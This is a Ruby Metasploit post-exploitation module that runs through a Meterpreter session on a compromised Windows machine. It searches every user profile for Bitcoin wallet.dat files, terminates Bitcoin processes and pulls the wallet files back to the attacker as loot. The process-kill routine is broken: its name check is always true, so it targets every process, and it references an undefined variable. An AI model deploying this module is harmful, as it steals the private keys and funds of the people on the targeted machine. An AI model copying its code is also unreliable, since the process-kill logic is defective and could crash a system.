##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post

  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Gather Bitcoin Wallet',
      'Description'   => %q{
        This module downloads any Bitcoin Wallet files from the target
        system.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'illwill <illwill[at]illmob.org>'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def run
    print_status("Checking All Users For Bitcoin Wallets...")
    grab_user_profiles().each do |user|
      next unless user['AppData']
      bitcoin_wallet_path = user['AppData'] + "\\Bitcoin\\wallet.dat"
      next unless file?(bitcoin_wallet_path)
      jack_bitcoin_wallet(bitcoin_wallet_path)
    end
  end

  def jack_bitcoin_wallet(wallet_path)
    data = ""
    print_status("Wallet found at #{wallet_path}")
    print_status("Jackin' their wallet...")

    kill_bitcoin # TODO: A little heavy-handed, determine when this should happen

    begin
      data = read_file(wallet_path) || ''
    rescue ::Exception => e
      print_error("Failed to download #{wallet_path}: #{e.class} #{e}")
      return
    end

    if data.empty?
      print_error("No data found")
    else
      loot_result = store_loot(
        "bitcoin.wallet",
        "application/octet-stream",
        session,
        data,
        wallet_path,
        "Bitcoin Wallet"
      )
      print_status("Wallet jacked: #{loot_result}")
    end
  end

  def kill_bitcoin
    client.sys.process.get_processes().each do |process|
      pname = process['name'].downcase
      if pname == "bitcoin.exe" || "bitcoind.exe"
        print_status("#{process['name']} Process Found...")
        print_status("Killing Process ID #{process['pid']}...")
        session.sys.process.kill(x['pid']) rescue nil
      end
    end
  end

end
